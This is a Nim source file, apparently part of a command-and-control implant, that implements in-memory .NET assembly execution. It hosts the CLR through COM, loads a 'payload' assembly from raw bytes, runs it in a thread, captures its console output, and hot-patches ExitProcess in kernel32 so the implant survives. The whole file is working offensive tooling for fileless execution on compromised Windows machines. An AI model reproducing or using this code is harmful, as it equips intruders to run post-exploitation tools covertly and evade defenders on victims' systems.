## In-memory .NET CLR hosting for the Nim agent.
##
## COM chain: CLRCreateInstance → ICLRMetaHost::GetRuntime(v4) →
##   ICLRRuntimeInfo::GetInterface(ICorRuntimeHost) → Start() →
##   GetDefaultDomain() → QI(_AppDomain) → Load_3(SAFEARRAY) →
##   get_EntryPoint() → Invoke_3() in a dedicated thread.
##
## ExitProcess is patched to ExitThread so assemblies calling
## Environment.Exit() don't kill the host process.

import winim/lean
import std/[strutils, sequtils]

# ── GUID constants ─────────────────────────────────────────────────────────────

template g32(x: uint32): int32 = cast[int32](x)

const
  CLSID_CLRMetaHost = GUID(Data1: g32(0x9280188d'u32), Data2: 0x0e8e'u16,
    Data3: 0x4867'u16, Data4: [0xb3.byte,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde])
  IID_ICLRMetaHost = GUID(Data1: g32(0xd332db9e'u32), Data2: 0xb9b3'u16,
    Data3: 0x4125'u16, Data4: [0x82.byte,0x07,0xa1,0x48,0x84,0xf5,0x32,0x16])
  IID_ICLRRuntimeInfo = GUID(Data1: g32(0xbd39d1d2'u32), Data2: 0xba2f'u16,
    Data3: 0x486a'u16, Data4: [0x89.byte,0xb0,0xb4,0xb0,0xcb,0x46,0x68,0x91])
  CLSID_CorRuntimeHost = GUID(Data1: g32(0xcb2f6723'u32), Data2: 0xab3a'u16,
    Data3: 0x11d2'u16, Data4: [0x9c.byte,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e])
  IID_ICorRuntimeHost = GUID(Data1: g32(0xcb2f6722'u32), Data2: 0xab3a'u16,
    Data3: 0x11d2'u16, Data4: [0x9c.byte,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e])
  IID_AppDomain = GUID(Data1: 0x05f696dc, Data2: 0x2b29'u16,
    Data3: 0x3663'u16, Data4: [0xad.byte,0x8b,0xc4,0x38,0x9c,0xf2,0xa7,0x13])
  VT_UI1_V   = WORD(17)
  VT_BSTR_V  = WORD(8)
  VT_ARRAY_V = WORD(0x2000)

# VARIANT on x64 Windows: vt(2) + 3×WORD(6) + data(8) = 16 bytes
type OleVar {.packed.} = object
  vt:       WORD
  r1,r2,r3: WORD
  data:     uint64

# ── COM vtable helper ─────────────────────────────────────────────────────────

proc vt(obj: pointer): ptr UncheckedArray[pointer] {.inline.} =
  cast[ptr UncheckedArray[pointer]](cast[ptr pointer](obj)[])

# ── SafeArray dynamic loader ──────────────────────────────────────────────────

type
  PfnSaCV = proc(vt: WORD, lb: LONG, n: ULONG): pointer {.stdcall.}
  PfnSaAD = proc(sa: pointer, pv: ptr pointer): HRESULT {.stdcall.}
  PfnSaUA = proc(sa: pointer): HRESULT {.stdcall.}
  PfnSaPE = proc(sa: pointer, idx: ptr LONG, pv: pointer): HRESULT {.stdcall.}
  PfnSaDe = proc(sa: pointer): HRESULT {.stdcall.}
  PfnSAS  = proc(s: LPCWSTR): BSTR {.stdcall.}
  PfnSFS  = proc(b: BSTR) {.stdcall.}

var
  gSaCV: PfnSaCV
  gSaAD: PfnSaAD
  gSaUA: PfnSaUA
  gSaPE: PfnSaPE
  gSaDe: PfnSaDe
  gSAS:  PfnSAS
  gSFS:  PfnSFS

proc loadOleaut32(): bool =
  let h = LoadLibraryA("oleaut32.dll")
  if h == 0: return false
  gSaCV = cast[PfnSaCV](GetProcAddress(h, "SafeArrayCreateVector"))
  gSaAD = cast[PfnSaAD](GetProcAddress(h, "SafeArrayAccessData"))
  gSaUA = cast[PfnSaUA](GetProcAddress(h, "SafeArrayUnaccessData"))
  gSaPE = cast[PfnSaPE](GetProcAddress(h, "SafeArrayPutElement"))
  gSaDe = cast[PfnSaDe](GetProcAddress(h, "SafeArrayDestroy"))
  gSAS  = cast[PfnSAS] (GetProcAddress(h, "SysAllocString"))
  gSFS  = cast[PfnSFS] (GetProcAddress(h, "SysFreeString"))
  return gSaCV != nil and gSaAD != nil and gSaUA != nil and
         gSaPE != nil and gSaDe != nil and gSAS != nil and gSFS != nil

proc bytesToSa(data: openArray[byte]): pointer =
  let sa = gSaCV(VT_UI1_V, 0, ULONG(data.len))
  if sa == nil: return nil
  var pv: pointer
  discard gSaAD(sa, addr pv)
  if pv != nil and data.len > 0:
    copyMem(pv, unsafeAddr data[0], data.len)
  discard gSaUA(sa)
  return sa

proc argsToParamSa(args: string): pointer =
  let parts = if args.len > 0: args.splitWhitespace() else: newSeq[string]()
  # inner = SAFEARRAY(VT_BSTR, N)
  let inner = gSaCV(VT_BSTR_V, 0, ULONG(parts.len))
  if inner == nil: return nil
  for i, p in parts:
    let ws   = newWideCString(p)
    let bstr = gSAS(ws)
    var idx  = LONG(i)
    discard gSaPE(inner, addr idx, cast[pointer](bstr))
    gSFS(bstr)
  # outer = SAFEARRAY(VT_VARIANT, 1)
  let outer = gSaCV(WORD(12), 0, 1)  # VT_VARIANT=12
  if outer == nil:
    discard gSaDe(inner)
    return nil
  var elem  = OleVar(vt: VT_ARRAY_V or VT_BSTR_V, data: cast[uint64](inner))
  var idx0  = LONG(0)
  discard gSaPE(outer, addr idx0, cast[pointer](addr elem))
  discard gSaDe(inner)
  return outer

# ── Stdout redirect ───────────────────────────────────────────────────────────

var gOrigOut, gOrigErr: HANDLE
var gTmpPath: array[MAX_PATH, WCHAR]

proc redirectStdout(): HANDLE =
  gOrigOut = GetStdHandle(STD_OUTPUT_HANDLE)
  gOrigErr = GetStdHandle(STD_ERROR_HANDLE)
  var tmpDir: array[MAX_PATH, WCHAR]
  discard GetTempPathW(DWORD(MAX_PATH), addr tmpDir[0])
  discard GetTempFileNameW(addr tmpDir[0], newWideCString("clr"), 0, addr gTmpPath[0])
  let fh = CreateFileW(addr gTmpPath[0],
    GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ,
    nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
  if fh == INVALID_HANDLE_VALUE: return INVALID_HANDLE_VALUE
  SetStdHandle(STD_OUTPUT_HANDLE, fh)
  SetStdHandle(STD_ERROR_HANDLE, fh)
  return fh

proc restoreStdout() =
  SetStdHandle(STD_OUTPUT_HANDLE, gOrigOut)
  SetStdHandle(STD_ERROR_HANDLE, gOrigErr)

proc readTempFile(fh: HANDLE): string =
  let size = GetFileSize(fh, nil)
  if size == 0 or size == INVALID_FILE_SIZE:
    discard CloseHandle(fh)
    discard DeleteFileW(addr gTmpPath[0])
    return "(no output)"
  var buf = newString(int(size))
  discard SetFilePointer(fh, 0, nil, FILE_BEGIN)
  var rd: DWORD
  discard ReadFile(fh, addr buf[0], size, addr rd, nil)
  buf.setLen(int(rd))
  discard CloseHandle(fh)
  discard DeleteFileW(addr gTmpPath[0])
  return buf

# ── ExitProcess hook → ExitThread ────────────────────────────────────────────

var
  gEpOrig: array[12, byte]
  gEpAddr: pointer
  gEpHooked = false

proc epStub(code: UINT) {.stdcall.} = ExitThread(DWORD(code))

proc installExitHook() =
  if gEpHooked: return
  let k32 = GetModuleHandleA("kernel32.dll")
  if k32 == 0: return
  gEpAddr = cast[pointer](GetProcAddress(k32, "ExitProcess"))
  if gEpAddr == nil: return
  var jmp: array[12, byte]
  jmp[0] = 0x48; jmp[1] = 0xB8
  var stub = cast[uint64](epStub)
  copyMem(addr jmp[2], addr stub, 8)
  jmp[10] = 0xFF; jmp[11] = 0xE0
  var old: DWORD
  discard VirtualProtect(gEpAddr, 12, PAGE_EXECUTE_READWRITE, addr old)
  copyMem(addr gEpOrig[0], gEpAddr, 12)
  copyMem(gEpAddr, addr jmp[0], 12)
  discard VirtualProtect(gEpAddr, 12, old, addr old)
  gEpHooked = true

proc removeExitHook() =
  if not gEpHooked or gEpAddr == nil: return
  var old: DWORD
  discard VirtualProtect(gEpAddr, 12, PAGE_EXECUTE_READWRITE, addr old)
  copyMem(gEpAddr, addr gEpOrig[0], 12)
  discard VirtualProtect(gEpAddr, 12, old, addr old)
  gEpHooked = false

# ── Invoke thread ─────────────────────────────────────────────────────────────

type InvokeWork = object
  pEP:      pointer
  saParams: pointer
  hr:       HRESULT

proc invokeThread(param: pointer): DWORD {.stdcall.} =
  let w  = cast[ptr InvokeWork](param)
  type PfnInv = proc(self: pointer, obj: ptr OleVar,
                     sa: pointer, ret: ptr OleVar): HRESULT {.stdcall.}
  var objV, retV: OleVar
  let fn = cast[PfnInv](vt(w.pEP)[37])
  w.hr = fn(w.pEP, addr objV, w.saParams, addr retV)
  return 0

# ── Main ──────────────────────────────────────────────────────────────────────

proc execDotNet*(asmBytes: openArray[byte], args: string): string =
  if asmBytes.len < 2: return "[!] dotnet_exec: empty payload"
  if not loadOleaut32(): return "[!] dotnet_exec: oleaut32.dll load failed"

  let hMs = LoadLibraryA("mscoree.dll")
  if hMs == 0: return "[!] dotnet_exec: mscoree.dll not found"
  type PfnCLRCI = proc(rclsid, riid: ptr GUID, ppUnk: ptr pointer): HRESULT {.stdcall.}
  let clrCI = cast[PfnCLRCI](GetProcAddress(hMs, "CLRCreateInstance"))
  if clrCI == nil: return "[!] dotnet_exec: CLRCreateInstance not found"

  var pMH: pointer
  var clsMH = CLSID_CLRMetaHost; var iidMH = IID_ICLRMetaHost
  if FAILED(clrCI(addr clsMH, addr iidMH, addr pMH)) or pMH == nil:
    return "[!] dotnet_exec: CLRCreateInstance failed"

  type PfnGR = proc(self: pointer, ver: LPCWSTR, riid: ptr GUID,
                    ppRti: ptr pointer): HRESULT {.stdcall.}
  var pRti: pointer; var iidRti = IID_ICLRRuntimeInfo
  if FAILED(cast[PfnGR](vt(pMH)[3])(pMH, newWideCString("v4.0.30319"),
                                     addr iidRti, addr pRti)) or pRti == nil:
    return "[!] dotnet_exec: GetRuntime failed"

  type PfnGI = proc(self: pointer, rclsid, riid: ptr GUID,
                    ppUnk: ptr pointer): HRESULT {.stdcall.}
  var pCH: pointer
  var clsCH = CLSID_CorRuntimeHost; var iidCH = IID_ICorRuntimeHost
  if FAILED(cast[PfnGI](vt(pRti)[9])(pRti, addr clsCH, addr iidCH, addr pCH)) or pCH == nil:
    return "[!] dotnet_exec: GetInterface failed"

  type PfnVoid = proc(self: pointer): HRESULT {.stdcall.}
  let hrStart = cast[PfnVoid](vt(pCH)[10])(pCH)
  if FAILED(hrStart) and hrStart != HRESULT(1):  # S_FALSE=1 = already started
    return "[!] dotnet_exec: Start failed"

  type PfnGDD = proc(self: pointer, ppUnk: ptr pointer): HRESULT {.stdcall.}
  var pDomThunk: pointer
  if FAILED(cast[PfnGDD](vt(pCH)[13])(pCH, addr pDomThunk)) or pDomThunk == nil:
    return "[!] dotnet_exec: GetDefaultDomain failed"

  type PfnQI = proc(self: pointer, riid: ptr GUID, ppv: ptr pointer): HRESULT {.stdcall.}
  var pAD: pointer; var iidAD = IID_AppDomain
  if FAILED(cast[PfnQI](vt(pDomThunk)[0])(pDomThunk, addr iidAD, addr pAD)) or pAD == nil:
    return "[!] dotnet_exec: QI _AppDomain failed"

  let saAsm = bytesToSa(asmBytes)
  if saAsm == nil: return "[!] dotnet_exec: bytes_to_sa failed"

  type PfnLoad3 = proc(self: pointer, sa: pointer,
                       ppAsm: ptr pointer): HRESULT {.stdcall.}
  var pAsm: pointer
  var hr = cast[PfnLoad3](vt(pAD)[44])(pAD, saAsm, addr pAsm)
  if FAILED(hr) or pAsm == nil:
    pAsm = nil
    hr = cast[PfnLoad3](vt(pAD)[45])(pAD, saAsm, addr pAsm)
  if FAILED(hr) or pAsm == nil:
    return "[!] dotnet_exec: Load_3 failed"

  type PfnGEP = proc(self: pointer, ppEP: ptr pointer): HRESULT {.stdcall.}
  var pEP: pointer
  if FAILED(cast[PfnGEP](vt(pAsm)[16])(pAsm, addr pEP)) or pEP == nil:
    return "[!] dotnet_exec: get_EntryPoint failed"

  let saParams = argsToParamSa(args)

  let fhTmp = redirectStdout()
  if fhTmp != INVALID_HANDLE_VALUE:
    SetStdHandle(STD_OUTPUT_HANDLE, fhTmp)
    SetStdHandle(STD_ERROR_HANDLE, fhTmp)

  var work = InvokeWork(pEP: pEP, saParams: saParams)
  installExitHook()
  let ht = CreateThread(nil, 0, invokeThread, addr work, 0, nil)
  if ht != 0:
    discard WaitForSingleObject(ht, DWORD(60_000))
    discard CloseHandle(ht)
  removeExitHook()
  restoreStdout()

  if saParams != nil: discard gSaDe(saParams)

  if fhTmp == INVALID_HANDLE_VALUE:
    return "(no output captured)"
  discard FlushFileBuffers(fhTmp)
  return readTempFile(fhTmp)
